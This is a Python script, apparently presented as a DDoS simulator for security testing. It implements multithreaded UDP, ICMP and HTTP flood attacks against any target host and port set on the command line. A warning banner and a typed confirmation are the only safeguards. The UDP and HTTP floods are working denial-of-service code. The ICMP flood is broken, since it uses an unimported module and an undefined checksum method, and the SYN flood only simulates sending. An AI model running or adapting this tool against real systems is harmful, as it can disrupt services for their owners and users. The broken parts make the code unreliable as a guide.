import socket
import time
import random
import argparse
import threading
from datetime import datetime

class DDoSSimulator:

    def __init__(self, target_ip="localhost", target_port=5556, duration=10, threads=5, 
                 packet_size=1024, attack_type="udp"):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.thread_count = threads
        self.packet_size = packet_size
        self.attack_type = attack_type.lower()
        self.attack_running = False
        self.packets_sent = 0
        self.start_time = None
        self.end_time = None
        
    def udp_flood(self, thread_id):

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        payload = random.randbytes(self.packet_size)

        while self.attack_running:
            try:
                sock.sendto(payload, (self.target_ip, self.target_port))
                self.packets_sent += 1
                time.sleep(0.001)
            except Exception as e:
                print(f"Error in UDP flood thread {thread_id}: {e}")
                break
        sock.close()
    
    def icmp_flood(self, thread_id):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except socket.error as e:
            print(f"Socket error: {e}")
            print("Note: ICMP flood requires root/admin privileges")
            return
            
        icmp_type = 8
        icmp_code = 0
        icmp_checksum = 0
        icmp_id = random.randint(0, 65535)
        icmp_seq = 1

        icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        
        payload = b"A" * self.packet_size
       
        icmp_packet = icmp_header + payload
        icmp_checksum = self._calculate_checksum(icmp_packet)
      
        icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        icmp_packet = icmp_header + payload
       
        while self.attack_running:
            try:
                sock.sendto(icmp_packet, (self.target_ip, 0))
                self.packets_sent += 1
                
                time.sleep(0.01)
            except Exception as e:
                print(f"Error in ICMP flood thread {thread_id}: {e}")
                break
                
        sock.close()
    
    def syn_flood(self, thread_id):
        
        try:
            # Raw socket for crafting custom TCP packets
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except socket.error as e:
            print(f"Socket error: {e}")
            print("Note: SYN flood requires root/admin privileges")
            return
            
        # Simplified version - in real testing, would need to craft proper TCP packets
        print("SYN flood requires packet crafting which is simplified in this demo")
        print(f"Thread {thread_id} would be sending SYN packets to {self.target_ip}:{self.target_port}")
        
        # Simulate sending instead of actual implementation
        while self.attack_running:
            self.packets_sent += 1
            time.sleep(0.01)
    
    def http_flood(self, thread_id):
        """Send HTTP requests (HTTP flood)"""
        import requests
        from requests.exceptions import RequestException
        
        # List of random URLs to request
        paths = ["/", "/api", "/data", "/metrics", "/status", "/config", "/dashboard"]
        
        # Send requests
        while self.attack_running:
            try:
                url = f"http://{self.target_ip}:{self.target_port}{random.choice(paths)}"
                requests.get(url, timeout=1)
                self.packets_sent += 1
                
                # Small delay
                time.sleep(0.2)
            except RequestException:
                # Ignore errors, just continue flooding
                self.packets_sent += 1
            except Exception as e:
                print(f"Error in HTTP flood thread {thread_id}: {e}")
                time.sleep(0.2)
    
    def start_attack(self):
        """Start the DDoS attack simulation"""
        if self.attack_running:
            print("Attack already running")
            return
            
        self.attack_running = True
        self.start_time = datetime.now()
        self.packets_sent = 0
        
        print(f"Starting {self.attack_type.upper()} flood attack against {self.target_ip}:{self.target_port}")
        print(f"Attack duration: {self.duration} seconds")
        print(f"Using {self.thread_count} threads with {self.packet_size} byte packets")
  
        threads = []
        for i in range(self.thread_count):
            if self.attack_type == "udp":
                t = threading.Thread(target=self.udp_flood, args=(i,))
            elif self.attack_type == "icmp":
                t = threading.Thread(target=self.icmp_flood, args=(i,))
            elif self.attack_type == "syn":
                t = threading.Thread(target=self.syn_flood, args=(i,))
            elif self.attack_type == "http":
                t = threading.Thread(target=self.http_flood, args=(i,))
            else:
                print(f"Unknown attack type: {self.attack_type}")
                self.attack_running = False
                return
                
            t.daemon = True
            t.start()
            threads.append(t)
            
        for remaining in range(self.duration, 0, -1):
            packets_so_far = self.packets_sent
            print(f"Attack in progress: {remaining}s remaining, {packets_so_far} packets sent")
            time.sleep(1)
       
        self.attack_running = False
        self.end_time = datetime.now()
        
        for t in threads:
            t.join(timeout=2)
            
        # Print summary
        duration = (self.end_time - self.start_time).total_seconds()
        rate = self.packets_sent / duration if duration > 0 else 0
        print("\nAttack completed!")
        print(f"Duration: {duration:.2f} seconds")
        print(f"Total packets sent: {self.packets_sent}")
        print(f"Rate: {rate:.2f} packets/second")
            
def main():
    parser = argparse.ArgumentParser(description='DDoS Simulation for Security Testing')
    parser.add_argument('--host', default='localhost', help='Target host IP address')
    parser.add_argument('--port', type=int, default=5556, help='Target port number')
    parser.add_argument('--duration', type=int, default=10, help='Attack duration in seconds')
    parser.add_argument('--threads', type=int, default=5, help='Number of attack threads')
    parser.add_argument('--size', type=int, default=1024, help='Packet size in bytes')
    parser.add_argument('--type', default='udp', choices=['udp', 'icmp', 'syn', 'http'], 
                        help='Attack type')
    args = parser.parse_args()
   
    print("""
⚠️ WARNING: This script simulates a DDoS attack for security testing purposes only.
Using this tool against systems without explicit permission is illegal and unethical.
Only use this against your own systems or those you have permission to test.
    """)
    
    confirm = input("Type 'CONFIRM' to acknowledge and proceed: ")
    if confirm != "CONFIRM":
        print("Confirmation not received. Exiting.")
        return
        
    try:
        simulator = DDoSSimulator(
            target_ip=args.host,
            target_port=args.port,
            duration=args.duration,
            threads=args.threads,
            packet_size=args.size,
            attack_type=args.type
        )
        
        simulator.start_attack()
    except KeyboardInterrupt:
        print("\nAttack aborted by user.")
    except Exception as e:
        print(f"Error: {e}")
        
    print("Testing completed.")

if __name__ == "__main__":
    main()